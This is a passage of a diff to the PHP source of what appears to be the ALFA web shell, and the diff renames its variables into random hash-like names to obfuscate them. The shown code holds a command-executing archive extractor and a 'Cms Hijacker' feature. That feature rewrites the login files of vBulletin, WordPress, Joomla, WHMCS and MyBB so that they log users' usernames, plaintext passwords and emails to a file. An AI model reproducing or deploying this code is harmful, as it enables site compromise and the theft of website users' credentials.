+$jfeaqldt1c837a6660014f0d862c65f9808fa839 = $_POST['alfa3'];
+$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 = $_POST['alfa4'];
+if(@!is_dir($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)){
+	@mkdir($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6, 0777, true);
 }
-$finfo = "";
-$file_type = "";
+$ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5 = "";
+$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = "";
 if(function_exists('finfo_open')){
-$finfo = @finfo_open(FILEINFO_MIME_TYPE);
-$file_type = @finfo_file($finfo, $dirzip);
-@finfo_close($finfo);
+$ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5 = @finfo_open(FILEINFO_MIME_TYPE);
+$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = @finfo_file($ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5, $jfeaqldt1c837a6660014f0d862c65f9808fa839);
+@finfo_close($ibhttvyd0361b5d917ea31386aa0cd1fa4e55bc5);
 }else{
 	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
-		$file_type = alfaEx('file -b --mime-type ' . $dirzip);
+		$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = alfaEx('file -b --mime-type ' . $jfeaqldt1c837a6660014f0d862c65f9808fa839);
 	}
 }
 if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
-switch ($file_type) {
+alfaEx("powershell expand-archive -path '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."' -destinationpath '".addslashes(basename($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6))."'");
+echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font></b></p></center>';
+}elseif($GLOBALS['sys']=='unix'&&!empty($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
+switch ($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9) {
 	case 'application/zip':
-		alfaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
+		alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';unzip '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
 	break;
 	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
-			alfaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
+		if(strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar.gz")||strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar")){
+			alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';tar xzf '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
 		}else{
-			alfaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
+			alfaEx("cd '".addslashes($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6)."';gunzip '".addslashes($jfeaqldt1c837a6660014f0d862c65f9808fa839)."'");
 		}
 	break;
 }
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
+echo __pre().'<center><p>Done -> <b><font color="green">'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'\');">[ View Folder ]</a></b></p></center>';
 }elseif(class_exists('ZipArchive')){
-	$itsok = false;
-	if(emtpy($file_type)){
-		$file_type = "application/zip";
+	$tedhgotv5848f9360ec5dbfe5a298637fa685438 = false;
+	if(emtpy($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9)){
+		$epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9 = "application/zip";
 	}
-	switch ($file_type) {
+	switch ($epkzkhcb68a7d484a2a1df7457fe2e4e12e936d9) {
 		case 'application/zip':
-			$zip = new ZipArchive;
-			$res = $zip->open($dirzip);
-			if ($res) {
-				$zip->extractTo($zipfile);
-				$zip->close();
-				$itsok = true;
+			$zessjrwjadcdbd79a8d84175c229b192aadc02f2 = new ZipArchive;
+			$ybaqpbzt9b207167e5381c47682c6b4f58a623fb = $zessjrwjadcdbd79a8d84175c229b192aadc02f2->open($jfeaqldt1c837a6660014f0d862c65f9808fa839);
+			if ($ybaqpbzt9b207167e5381c47682c6b4f58a623fb) {
+				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
+				$zessjrwjadcdbd79a8d84175c229b192aadc02f2->close();
+				$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
 			}
 		break;
 		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-			if(strstr(basename($dirzip), ".tar.gz")){
-				$new_file = $zipfile .'/'. basename($dirzip);
-				@copy($dirzip, $new_file);
-				$new_tar = str_replace(".tar.gz", ".tar", $new_file);
+			if(strstr(basename($jfeaqldt1c837a6660014f0d862c65f9808fa839), ".tar.gz")){
+				$wohvjslj25fa8325e4e0eb8180445e42558e60bd = $csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6 .'/'. basename($jfeaqldt1c837a6660014f0d862c65f9808fa839);
+				@copy($jfeaqldt1c837a6660014f0d862c65f9808fa839, $wohvjslj25fa8325e4e0eb8180445e42558e60bd);
+				$rqzvyajra96c1a17513b2b220f4e849d603c20db = str_replace(".tar.gz", ".tar", $wohvjslj25fa8325e4e0eb8180445e42558e60bd);
 				try {
-					$p = new PharData($new_file);
-					$p->decompress();
-					$phar = new PharData($new_tar);
-					$phar->extractTo($zipfile);
-					@unlink($new_file);
-					@unlink($new_tar);
-					$itsok = true;
-				} catch (Exception $e) {
+					$fxuvmwpb83878c91171338902e0fe0fb97a8c47a = new PharData($wohvjslj25fa8325e4e0eb8180445e42558e60bd);
+					$fxuvmwpb83878c91171338902e0fe0fb97a8c47a->decompress();
+					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102 = new PharData($rqzvyajra96c1a17513b2b220f4e849d603c20db);
+					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
+					@unlink($wohvjslj25fa8325e4e0eb8180445e42558e60bd);
+					@unlink($rqzvyajra96c1a17513b2b220f4e849d603c20db);
+					$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
+				} catch (Exception $qxcuilgde1671797c52e15f763380b45e841ec32) {
 				}
 			}else{
 				try {
-					$phar = new PharData($dirzip);
-					$phar->extractTo($zipfile);
-					$itsok = true;
-				} catch (Exception $e) {
+					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102 = new PharData($jfeaqldt1c837a6660014f0d862c65f9808fa839);
+					$vrrwjjzwd7f4be9d064bac5fd42207b3d7efe102->extractTo($csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6);
+					$tedhgotv5848f9360ec5dbfe5a298637fa685438 = true;
+				} catch (Exception $qxcuilgde1671797c52e15f763380b45e841ec32) {
 				}
 			}
 		break;
 	}
-if($itsok){
-echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></p></center>';
+if($tedhgotv5848f9360ec5dbfe5a298637fa685438){
+echo __pre().'<center><p><font color="green">Success...!<br>'.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$csyskoaye11e41bfc3f3cbad6b02bd30f9ab11c6.'\');">[ View Folder ]</a></p></center>';
 }else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
 }
 }
@@ -5496,68 +5569,68 @@ AlfaNum(5,6,7,8,9,10);
 echo '<div class=header><br>
 <center><div class="txtfont_header">| Cms Hijacker |</div><br><br><form onSubmit="g(\'cmshijacker\',null,this.cmshi.value,this.saveto.value,\'>>\',this.cmspath.value);return false;" method=\'post\'>
 <div class="txtfont">CMS: <select style="width:100px;" name="cmshi">';
-$cm_array = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb");
-foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
+$dbaqodsdf0a8d484466c281c1a9087b40aacc270 = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb");
+foreach($dbaqodsdf0a8d484466c281c1a9087b40aacc270 as $ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d=>$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf)echo '<option value="'.$ybzpthgq3c6e0b8a9c15224a8228b9a98ca1531d.'">'.$jjhpbbnw3a6d0284e743dc4a9b86f97d6dd1a3bf.'</option>';
 echo("</select>");
 echo ' Path installed cms: <input size="50" type="text" name="cmspath" placeholder="ex: /home/user/public_html/vbulletin/">
 SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'alfa.txt"></font>
 <input type="submit" name="btn" value=" "></form></center><br>';
-$cms = $_POST['alfa1'];
-$saveto = $_POST['alfa2'];
-$cmspath = $_POST['alfa4'];
-if(!empty($cms) AND !empty($saveto) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
+$enqiaukc570d99e4c85914470d914170d1e95144 = $_POST['alfa1'];
+$wgcxhsoqac72b865603145ad0871f59f6d06a776 = $_POST['alfa2'];
+$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910 = $_POST['alfa4'];
+if(!empty($enqiaukc570d99e4c85914470d914170d1e95144) AND !empty($wgcxhsoqac72b865603145ad0871f59f6d06a776) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
 echo __pre();
-alfaHijackCms($cms,$cmspath,$saveto);
+alfaHijackCms($enqiaukc570d99e4c85914470d914170d1e95144,$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }
 echo '</div>';
 alfafooter();
 }
-function alfaHijackCms($cms,$cmspath,$saveto){
-switch($cms){
+function alfaHijackCms($enqiaukc570d99e4c85914470d914170d1e95144,$pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+switch($enqiaukc570d99e4c85914470d914170d1e95144){
 case "vb":
-hijackvBulletin($cmspath,$saveto);
+hijackvBulletin($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "wp":
-hijackwp($cmspath,$saveto);
+hijackwp($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "jom":
-hijackJoomla($cmspath,$saveto);
+hijackJoomla($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "whmcs":
-hijackWhmcs($cmspath,$saveto);
+hijackWhmcs($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "mybb":
-hijackMybb($cmspath,$saveto);
+hijackMybb($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "ipb":
-hijackIPB($cmspath,$saveto);
+hijackIPB($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 case "phpbb":
-hijackPHPBB($cmspath,$saveto);
+hijackPHPBB($pgtimdyod8c6e4d68ae4c7e615fe67ed7249e910,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 break;
 default:
 echo "error!";
 break;
 }
 }
-function hijackvBulletin($path,$saveto){
-$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
-$clearpw = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login = $path."/login.php";
-$class = $path."/includes/class_bootstrap.php";
-$dologin = 'do_login_redirect();';
-$evil_login = "\t".$code."\n\t".$dologin;
-$evil_class = "true";
-if((@is_file($login) AND @is_writable($login)) || (@is_file($class) AND @is_writable($class))){
-$data_login = @file_get_contents($login);
-$data_class = @file_get_contents($class);
-if(strstr($data_login, $dologin) || strstr($data_class, $clearpw)){
-$login_replace = str_replace($dologin,$evil_login, $data_login);
-$class_replace = str_replace($clearpw,$evil_class, $data_class);
-@file_put_contents($login, $login_replace);
-@file_put_contents($class, $class_replace);
-hijackOutput(0,$saveto);
+function hijackvBulletin($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
+$jigizpteada59f5126d6709496897d33144a62e0 = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$predzshad56b699830e77ba53855679cb1d252da = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/login.php";
+$xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d = $jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/includes/class_bootstrap.php";
+$boirntxp747a0737575ae07334599cdae8412534 = 'do_login_redirect();';
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab."\n\t".$boirntxp747a0737575ae07334599cdae8412534;
+$wvpogbijfb8310058f26e344588c6b8a4a287710 = "true";
+if((@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)) || (@is_file($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d) AND @is_writable($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d))){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+$jbantpyi9ce976eb3576451968898a758a7783bf = @file_get_contents($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d);
+if(strstr($pylqbhytf29de8859fa34b6b370a904615dfd949, $boirntxp747a0737575ae07334599cdae8412534) || strstr($jbantpyi9ce976eb3576451968898a758a7783bf, $jigizpteada59f5126d6709496897d33144a62e0)){
+$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = str_replace($boirntxp747a0737575ae07334599cdae8412534,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
+$dfupzguc2b69dbca3e0042b6ea38049da08753ca = str_replace($jigizpteada59f5126d6709496897d33144a62e0,$wvpogbijfb8310058f26e344588c6b8a4a287710, $jbantpyi9ce976eb3576451968898a758a7783bf);
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
+@file_put_contents($xidctbyra2f2ed4f8ebc2cbb4c21a29dc40ab61d, $dfupzguc2b69dbca3e0042b6ea38049da08753ca);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
@@ -5565,18 +5638,18 @@ hijackOutput(1);
 hijackOutput(1);
 }
 }
-function hijackwp($path,$saveto){
-$code = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
-$redirect_wp = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/wp-login.php";
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(@preg_match($redirect_wp, $data_login, $match)){
-$evil_login = "\t".$match[0]."\n\t".$code;
-$login_replace = @preg_replace($redirect_wp,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
+function hijackwp($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '$alfa_file="{saveto_path}";$fp = fopen($alfa_file, "a+");fwrite($fp, $_POST[\'log\']." : ".$_POST[\'pwd\']." (".($user->user_email).")\n");fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);';
+$vhypaymu6234be57b1b43c4e1acafb5345617be1 = '#if[ ]{0,}\([ ]{0,}![ ]{0,}is_wp_error\([ ]{0,}\$user[ ]{0,}\)[ ]{0,}&&[ ]{0,}![ ]{0,}\$reauth[ ]{0,}\)[ ]{0,}{#';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$predzshad56b699830e77ba53855679cb1d252da=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/wp-login.php";
+if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da)){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+if(@preg_match($vhypaymu6234be57b1b43c4e1acafb5345617be1, $pylqbhytf29de8859fa34b6b370a904615dfd949, $ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc)){
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = "\t".$ppwzlnqze3cc92c14a5e6dd1a7d94b6ff634d7fc[0]."\n\t".$nndigmblc13367945d5d4c91047b3b50234aa7ab;
+$arcxbuvs5646bf90053257c69df1a3ccdb5a549e = @preg_replace($vhypaymu6234be57b1b43c4e1acafb5345617be1,$uwdiozugf5a48ef92b35de034fdf7ff052412fbb, $pylqbhytf29de8859fa34b6b370a904615dfd949);
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $arcxbuvs5646bf90053257c69df1a3ccdb5a549e);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
@@ -5584,71 +5657,52 @@ hijackOutput(1);
 hijackOutput(1);
 }
 }
-function hijackJoomla($path,$saveto){
-$code = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$comp=$path."/administrator/components/com_login/";
-if(@is_file($comp."/login.php")){
-$login = $comp."/login.php";
-}elseif(@is_file($comp."/admin.login.php")){
-$login = $comp."/admin.login.php";
+function hijackJoomla($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php jimport(\'joomla.user.authentication\');$Alfa_auth = & JAuthentication::getInstance();$Alfa_data = array(\'username\'=>$_POST[\'username\'],\'password\'=>$_POST[\'passwd\']);$Alfa_options = array();$Alfa_response = $Alfa_auth->authenticate($Alfa_data, $Alfa_options);if($Alfa_response->status == 1){$alfa_file="{saveto_path}";$fp=@fopen($alfa_file,"a+");@fwrite($fp, $Alfa_response->username.":".$_POST[\'passwd\']." ( ".$Alfa_response->email." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}?>';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$deinbilp005480c8a6a0357d17cff2e8eb7e060d=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/administrator/components/com_login/";
+if(@is_file($deinbilp005480c8a6a0357d17cff2e8eb7e060d."/login.php")){
+$predzshad56b699830e77ba53855679cb1d252da = $deinbilp005480c8a6a0357d17cff2e8eb7e060d."/login.php";
+}elseif(@is_file($deinbilp005480c8a6a0357d17cff2e8eb7e060d."/admin.login.php")){
+$predzshad56b699830e77ba53855679cb1d252da = $deinbilp005480c8a6a0357d17cff2e8eb7e060d."/admin.login.php";
 }else{
-$login = '';
+$predzshad56b699830e77ba53855679cb1d252da = '';
 }
-if(@is_file($login) AND @is_writable($login) AND $login != ''){
-$data_login = @file_get_contents($login);
-$evil_login = $code."\n".$data_login;
-@file_put_contents($login, $evil_login);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
-}
-function hijackWhmcs($path,$saveto){
-$code = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$conf=$path."/configuration.php";
-if(@is_file($conf) AND @is_writable($conf)){
-$data_conf = @file_get_contents($conf);
-if(!strstr($data_conf,'?>'))$code = '?>'.$code;
-$evil_conf = $data_conf."\n".$code;
-@file_put_contents($conf, $evil_conf);
-hijackOutput(0,$saveto);
+if(@is_file($predzshad56b699830e77ba53855679cb1d252da) AND @is_writable($predzshad56b699830e77ba53855679cb1d252da) AND $predzshad56b699830e77ba53855679cb1d252da != ''){
+$pylqbhytf29de8859fa34b6b370a904615dfd949 = @file_get_contents($predzshad56b699830e77ba53855679cb1d252da);
+$uwdiozugf5a48ef92b35de034fdf7ff052412fbb = $nndigmblc13367945d5d4c91047b3b50234aa7ab."\n".$pylqbhytf29de8859fa34b6b370a904615dfd949;
+@file_put_contents($predzshad56b699830e77ba53855679cb1d252da, $uwdiozugf5a48ef92b35de034fdf7ff052412fbb);
+hijackOutput(0,$wgcxhsoqac72b865603145ad0871f59f6d06a776);
 }else{
 hijackOutput(1);
 }
 }
-function hijackMybb($path,$saveto){
-$code = '$alfa_q = $db->query("SELECT `email` FROM ".TABLE_PREFIX."users WHERE `username` = \'".$user[\'username\']."\'");$alfa_fetch = $db->fetch_array($alfa_q);$alfa_file = "{saveto_path}";$fp = @fopen($alfa_file, "a+");@fwrite($fp, $user[\'username\']." : ". $user[\'password\']." ( ".$alfa_fetch[\'email\']." )\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);';
-$find = '$loginhandler->complete_login();';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login=$path."/member.php";
-$evil_login = "\t".$code."\n\t".$find;
-if(@is_file($login) AND @is_writable($login)){
-$data_login = @file_get_contents($login);
-if(strstr($data_login, $find)){
-$login_replace = str_replace($find,$evil_login, $data_login);
-@file_put_contents($login, $login_replace);
-hijackOutput(0,$saveto);
-}else{
-hijackOutput(1);
-}
+function hijackWhmcs($jwzcflrpd6fe1d0be6347b8ef2427fa629c04485,$wgcxhsoqac72b865603145ad0871f59f6d06a776){
+$nndigmblc13367945d5d4c91047b3b50234aa7ab = '<?php if(isset($_POST[\'username\']) AND isset($_POST[\'password\']) AND !empty($_POST[\'username\']) AND !empty($_POST[\'password\'])){if($alfa_connect=@mysqli_connect($db_host,$db_username,$db_password,$db_name)){$alfa_file = "{saveto_path}";$alfa_uname = @$_POST[\'username\'];$alfa_pw = @$_POST[\'password\'];if(isset($_POST[\'language\'])){$alfa_q = "SELECT * FROM tbladmins WHERE `username` = \'$alfa_uname\' AND `password` = \'".md5($alfa_pw)."\'";$admin = true;}else{$alfa_q = "SELECT * FROM tblclients WHERE `email` = \'$alfa_uname\'";$admin = false;}$alfa_query = mysqli_query($alfa_connect, $alfa_q);if(mysqli_num_rows($alfa_query) > 0 ){$row = mysqli_fetch_array($alfa_query);$allow = true;if(!$admin){$__salt = explode(\':\', $row[\'password\']);$__encPW = md5($__salt[1].$_POST[\'password\']).\':\'.$__salt[1];if($row[\'password\'] == $__encPW){$allow = true;$row[\'username\'] = $row[\'email\'];}else{$allow = false;}}if($allow){$fp = @fopen($alfa_file, "a+");@fwrite($fp, $row[\'username\'] . \' : \' .  $alfa_pw." (" . $row["email"] . ") : ".($admin ? \'is_admin\' : \'is_user\')."\n");@fclose($fp);$f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fwrite($fp, $values);}@fclose($fp);}}}}?>';
+$nndigmblc13367945d5d4c91047b3b50234aa7ab=str_replace('{saveto_path}',$wgcxhsoqac72b865603145ad0871f59f6d06a776,$nndigmblc13367945d5d4c91047b3b50234aa7ab);
+$evugkozj3a8e4c06e471595f6eb262bb9b5582d9=$jwzcflrpd6fe1d0be6347b8ef2427fa629c04485."/configuration.php";
+if(@is_file($evugkozj3a8e4c06e471595f6eb262bb9b5582d9) AND @is_writable($evugkozj3a8e4c06e471595f6eb262bb9b5582d9)){
+$nvkkuaxh7f224eabb16b0fbd15c7dd7b8da65d26 = @file_get_contents($evugkozj3a8e4c06e471595f6eb262bb9b5582d9);
